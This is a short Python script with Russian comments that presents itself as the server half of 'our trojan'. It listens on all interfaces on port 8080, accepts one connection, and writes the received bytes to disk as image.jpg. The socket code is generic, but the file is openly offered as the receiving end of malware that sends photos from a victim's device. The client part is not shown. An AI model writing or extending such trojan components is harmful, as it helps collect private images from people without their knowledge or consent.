# Файл сервера нашего "трояна", который принимает фото от клиента и сохраняет на диск
import socket

# настройки сервера
SERVER_HOST = '0.0.0.0'  # Необязательно менять. В таком виде слушает все доступные адреса устройства
SERVER_PORT = 8080

# создаем сокет
server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# привязываем сокет к адресу и порту
server_socket.bind((SERVER_HOST, SERVER_PORT))

# слушаем входящие соединения
server_socket.listen(1)
print("Server is listening...")

# принимаем входящее соединение
connection, address = server_socket.accept()
print("Connected by", address)

# получаем изображение от клиента
image_data = bytearray()
while True:
    data = connection.recv(1024)
    if not data:
        break
    image_data.extend(data)

# сохраняем изображение на диск
with open("image.jpg", "wb") as f:
    f.write(image_data)

print('Фотография сохранена в файле image.jpg')

# закрываем соединение
connection.close()
